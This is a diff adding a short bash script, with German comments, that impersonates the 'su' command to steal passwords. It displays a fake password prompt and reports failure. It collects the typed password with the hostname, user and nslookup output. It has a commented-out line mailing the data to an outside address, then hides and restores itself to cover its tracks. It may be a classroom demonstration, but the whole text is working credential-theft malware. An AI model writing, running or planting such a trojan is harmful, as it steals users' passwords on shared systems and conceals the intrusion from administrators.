@@ -1,0 +1,38 @@
+#!/bin/bash
+# Passwortklau, erfordert "." im Suchpfad
+
+TMPFILE=./.su_tmp	   # temporäre Datei für Informationen
+MVSCRIPT=./.su_move	   # Script zum move von su
+MAIL_FROM=user@domain.test # Mail Absender
+MAIL_TO=it2009@it2009.ba-leipzig.de # Mail Empfänger
+
+##### optisch Verhalten nachbilden
+echo -n "Passwort: "
+read -s PASSWORD
+echo ""		# Zeilenvorschub nach <Enter>
+sleep 3		# 3 s warten
+echo "su: ungültiges Kennwort"
+##### Informationen sammeln
+echo $0" "$@ > $TMPFILE	# Kommando und alle Parameter
+echo "Hostname: "$HOSTNAME >> $TMPFILE
+echo "User:     "$USER     >> $TMPFILE
+echo "Passwort: "$PASSWORD >> $TMPFILE
+echo "Ausgabe von nslookup "$HOSTNAME" :" >> $TMPFILE
+nslookup $HOSTNAME         >> $TMPFILE # IP ermitteln
+echo "."                   >> $TMPFILE # Ende der Mail
+##### Mail senden
+# mail -s Passwortklau -r $MAIL_FROM $MAIL_TO < $TMPFILE
+##### temporäre Datei löschen
+rm $TMPFILE
+##### Script temporär verbergen
+
+echo "#!/bin/bash"		>  $MVSCRIPT
+echo "sleep 10"                 >> $MVSCRIPT
+echo "mv .su su"                >> $MVSCRIPT
+echo "rm $MVSCRIPT"             >> $MVSCRIPT
+chmod 755 $MVSCRIPT
+$MVSCRIPT & > /dev/null
+
+mv su .su	# Script su versteckent 
+
+exit 1		# ungültiges Kennwort liefert exit-Status 1
